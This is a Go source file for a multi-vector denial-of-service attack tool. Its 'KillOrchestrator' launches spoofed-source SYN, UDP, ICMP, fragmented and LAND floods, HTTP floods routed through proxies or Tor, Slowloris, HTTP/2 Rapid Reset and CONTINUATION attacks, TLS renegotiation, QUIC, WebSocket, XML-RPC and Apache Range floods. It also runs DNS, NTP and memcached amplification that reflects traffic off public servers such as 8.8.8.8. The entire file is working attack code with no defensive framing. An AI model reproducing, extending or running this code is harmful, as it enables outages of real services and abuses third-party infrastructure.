package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

type KillOrchestrator struct {
	cfg    *AttackConfig
	status chan<- WorkerStats
	stop   int32
}

type GoroutineCounter struct{ count int32 }

func (g *GoroutineCounter) Add() int32   { return atomic.AddInt32(&g.count, 1) }
func (g *GoroutineCounter) Done() int32   { return atomic.AddInt32(&g.count, -1) }
func (g *GoroutineCounter) Load() int32   { return atomic.LoadInt32(&g.count) }
func (g *GoroutineCounter) Set(n int32) { atomic.StoreInt32(&g.count, n) }

func NewKillOrchestrator(cfg *AttackConfig, status chan<- WorkerStats) *KillOrchestrator {
	return &KillOrchestrator{cfg: cfg, status: status}
}

func (ko *KillOrchestrator) Stop()         { atomic.StoreInt32(&ko.stop, 1) }
func (ko *KillOrchestrator) stopped() bool { return atomic.LoadInt32(&ko.stop) != 0 }

func (ko *KillOrchestrator) Run(done chan<- struct{}) {
	defer func() {
		if r := recover(); r != nil {
			errf(`{"type":"recover","message":"kill mode panic: %v"}`+"\n", r)
		}
	}()

	err := InitEngine()
	if err != nil {
		errf(`{"type":"error","message":"init engine: %v"}`+"\n", err)
		done <- struct{}{}
		return
	}
	defer CloseEngine()

	targetIP := ko.cfg.Target
	targetPort := ko.cfg.Port
	duration := ko.cfg.Duration
	workers := ko.cfg.Workers
	if workers < 10 { workers = 512 }
	if workers > 4096 { workers = 4096 }
	size := ko.cfg.Size
	if size < 64 { size = 65000 }

	spoofPool := ko.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 200)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}
	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	SetSpoofPool(spoofU32)

	ratios := parseMixRatio(ko.cfg.MixRatio)
	methods := []string{"l4", "http", "slowloris", "amp"}
	pcts := make([]int, len(methods))
	for i, m := range methods {
		if p, ok := ratios[m]; ok {
			pcts[i] = p
		}
	}

	deadline := time.Now().Add(time.Duration(duration) * time.Second)
	var pool GoroutineCounter

	/* L4 attack: batch C-flood + raw goroutines */
	if pcts[0] > 0 {
		l4workers := workers * pcts[0] / 100
		if l4workers < 1 { l4workers = 64 }
		ko.runL4(targetIP, targetPort, size, l4workers, duration, spoofPool, &pool, deadline)
	}

	/* HTTP flood */
	if pcts[1] > 0 {
		httpWorkers := workers * pcts[1] / 100
		if httpWorkers < 1 { httpWorkers = 16 }
		ko.runHTTPKill(targetIP, targetPort, httpWorkers, duration, spoofPool, &pool, deadline)
	}

	/* Slowloris */
	if pcts[2] > 0 {
		slowWorkers := workers * pcts[2] / 100
		if slowWorkers < 1 { slowWorkers = 50 }
		ko.runSlowloris(targetIP, targetPort, slowWorkers, duration, spoofPool, &pool, deadline)
	}

	/* Amplification */
	if pcts[3] > 0 {
		ampWorkers := workers * pcts[3] / 100
		if ampWorkers < 1 { ampWorkers = 32 }
		ko.runAmp(targetIP, targetPort, ampWorkers, duration, spoofPool, &pool, deadline)
	}

	/* Wait for deadline, then stop */
	time.Sleep(time.Until(deadline))
	StopBatchFlood()
	done <- struct{}{}
}

func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
	_ = StartBatchFlood(targetIP, targetPort, 0, workers, size, duration)

	tip32, err := resolveTarget(targetIP)
	if err != nil { return }
	tport16 := uint16(targetPort)

	for i := 0; i < workers && i < 1024; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				/* Single cgo call replaces 4 per-packet cgo calls */
				MultiSend(tip32, tport16, 0, 256) /* SYN */
				MultiSend(tip32, tport16, 1, 256) /* UDP */
				MultiSend(tip32, tport16, 2, 256) /* ACK */
				MultiSend(tip32, tport16, 3, 256) /* RST */
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* ICMP storm — use legacy path (no batch avail for ICMP yet) */
	for i := 0; i < 64; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				SendICMP(targetIP, spoof)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* Fragmented flood */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				SendFragmentedSYN(targetIP, targetPort, spoof)
				SendFragmentedUDP(targetIP, targetPort, spoof, size)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* Stateful bypass flood */
	for i := 0; i < 64; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				StatefulBypassFlood(targetIP, targetPort, spoofPool[rand.Intn(len(spoofPool))])
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* LAND attack */
	for i := 0; i < 16; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				SendLAND(targetIP, targetPort)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* H2 Rapid Reset */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				H2RapidReset(targetIP, targetPort, spoof, 256)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* H2 CONTINUATION flood (CVE-2024-27316) */
	for i := 0; i < 16; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				spU32 := parseSpoof(spoof)
				H2ContinuationFlood(parseSpoof(targetIP), uint16(targetPort), spU32, 500, 10)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* TLS Renegotiation flood */
	for i := 0; i < 16; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			for time.Now().Before(deadline) && !ko.stopped() {
				tcpConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}
				tlsConn := tls.Client(tcpConn, &tls.Config{
					InsecureSkipVerify: true,
					MaxVersion:         tls.VersionTLS13,
					CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256},
				})
				if err := tlsConn.Handshake(); err != nil {
					tcpConn.Close()
					time.Sleep(10 * time.Millisecond)
					continue
				}
				for attempt := 0; attempt < 100; attempt++ {
					if time.Now().After(deadline) || ko.stopped() {
						break
					}
					ch := buildFakeClientHello()
					if _, err := tcpConn.Write(ch); err != nil {
						break
					}
				}
				tlsConn.Close()
				tcpConn.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* QUIC/HTTP3 flood */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			raddr, err := net.ResolveUDPAddr("udp", addr)
			if err != nil { return }
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil { return }
			defer conn.Close()
			for time.Now().Before(deadline) && !ko.stopped() {
				pkt := buildQUICInitial()
				conn.Write(pkt)
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* gRPC unary flood */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { time.Sleep(10 * time.Millisecond); continue }
				conn.Write(buildGRPCUnaryFrame())
				conn.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* WebSocket connect+ping flood */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { time.Sleep(10 * time.Millisecond); continue }
				key := randStr(16)
				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
				conn.Write([]byte(upgrade))
				maskKey := []byte{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
				payload := make([]byte, 64)
				for j := range payload { payload[j] = byte(rand.Intn(256)) }
				for i := 0; i < 100; i++ {
					if time.Now().After(deadline) || ko.stopped() { break }
					frame := buildWSPing(maskKey, payload)
					if _, err := conn.Write(frame); err != nil { break }
				}
				conn.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* WordPress XML-RPC + GraphQL flood */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			xmlPayload := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/</string></value></param><param><value><string>http://` + targetIP + `/</string></value></param></params></methodCall>`
			graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { time.Sleep(10 * time.Millisecond); continue }
				xmlReq := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(xmlPayload), xmlPayload)
				conn.Write([]byte(xmlReq))
				conn.Close()

				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil { time.Sleep(10 * time.Millisecond); continue }
				gqlReq := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(graphqlPayload), graphqlPayload)
				conn2.Write([]byte(gqlReq))
				conn2.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}

	/* ─── CPU Exhaustion Workers ────────────────────────────────── */
	/* Slow Read — exhaust connection table (minimal local CPU) */
	for i := 0; i < 32; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			buf := make([]byte, 1)
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil { time.Sleep(100 * time.Millisecond); continue }
				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n", targetIP)
				conn.Write([]byte(req))
				for i := 0; i < 10 && time.Now().Before(deadline) && !ko.stopped(); i++ {
					conn.SetReadDeadline(time.Now().Add(30 * time.Second))
					conn.Read(buf)
					time.Sleep(30 * time.Second)
				}
				conn.Close()
			}
		}()
	}

	/* Range Flood — Apache CPU burn (1000 overlapping ranges) */
	for i := 0; i < 16; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			var rangeHdr string
			for j := 0; j < 1000; j++ {
				if j > 0 { rangeHdr += ", " }
				rangeHdr += fmt.Sprintf("bytes=%d-%d", j*100, j*100+500+j)
			}
			tmp := make([]byte, 1024)
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil { time.Sleep(100 * time.Millisecond); continue }
				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nRange: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", targetIP, rangeHdr)
				conn.Write([]byte(req))
				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				conn.Read(tmp)
				conn.Close()
			}
		}()
	}

	/* SSL Reneg — repeated ClientHello after handshake */
	for i := 0; i < 16; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
			hello := buildFakeClientHello()
			for time.Now().Before(deadline) && !ko.stopped() {
				tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil { time.Sleep(100 * time.Millisecond); continue }
				tlsConn := tls.Client(tcpConn, &tls.Config{
					InsecureSkipVerify: true,
					MaxVersion:         tls.VersionTLS13,
				})
				if err := tlsConn.Handshake(); err != nil {
					tcpConn.Close(); continue
				}
				for i := 0; i < 50 && !ko.stopped(); i++ {
					if _, err := tcpConn.Write(hello); err != nil { break }
				}
				tlsConn.Close()
				tcpConn.Close()
			}
		}()
	}
}

func (ko *KillOrchestrator) runHTTPKill(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
	flooder := NewHTTPFlooder()
	proxyList := ko.cfg.ProxyList
	if len(proxyList) == 0 && ko.cfg.TorProxy != "" {
		proxyList = []string{ko.cfg.TorProxy}
	}
	go flooder.RunKill(targetIP, targetPort, workers, 999999999, duration, proxyList, 0, ko.status)
	pool.Add()
	go func() {
		defer pool.Done()
		time.Sleep(time.Until(deadline))
		flooder.Stop()
	}()
}

func (ko *KillOrchestrator) runSlowloris(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
	for i := 0; i < workers && i < 512; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 5*time.Second)
				if err != nil { time.Sleep(100 * time.Millisecond); continue }
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nUser-Agent: Mozilla/5.0\r\n"))
				for time.Now().Before(deadline) && !ko.stopped() {
					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
					_, err := conn.Write([]byte("X-a: " + randStr(128) + "\r\n"))
					if err != nil { break }
					time.Sleep(100 * time.Millisecond)
				}
				conn.Close()
				time.Sleep(10 * time.Millisecond)
			}
		}()
	}
}

func (ko *KillOrchestrator) runAmp(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
	/* Initialize amplification bank with all 11 protocols */
	tip := parseSpoof(targetIP)
	AmpBankInit(tip, uint16(targetPort))

	/* Spawn workers using amp_bank — random protocol per packet, batched sendmmsg */
	for i := 0; i < workers; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			AmpBankFloodAll(99999999)
		}()
	}

	/* Also keep legacy individual server-based amplification for variety */
	dnsServers := []string{"8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"}
	ntpServers := []string{"pool.ntp.org", "time.google.com"}
	memcachedServers := []string{"1.2.3.4"}

	for i := 0; i < workers/2; i++ {
		pool.Add()
		go func() {
			defer pool.Done()
			for time.Now().Before(deadline) && !ko.stopped() {
				spoof := spoofPool[rand.Intn(len(spoofPool))]
				switch rand.Intn(4) {
				case 0:
					SendDNSAmp(targetIP, spoof, dnsServers[rand.Intn(len(dnsServers))])
				case 1:
					SendNTPAmp(targetIP, spoof, ntpServers[rand.Intn(len(ntpServers))])
				case 2:
					MemcachedAmp(targetIP, spoof, memcachedServers[rand.Intn(len(memcachedServers))])
				case 3:
					AmpBankFloodAll(1000)
				}
			}
		}()
	}
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func parseMixRatio(ratio string) map[string]int {
	result := map[string]int{"l4": 25, "http": 25, "slowloris": 25, "amp": 25}
	if ratio == "" { return result }
	var l4, http, slow, amp int
	n, _ := fmt.Sscanf(ratio, "%d:%d:%d:%d", &l4, &http, &slow, &amp)
	if n == 4 {
		total := l4 + http + slow + amp
		if total > 0 {
			result["l4"] = l4
			result["http"] = http
			result["slowloris"] = slow
			result["amp"] = amp
		}
	}
	return result
}
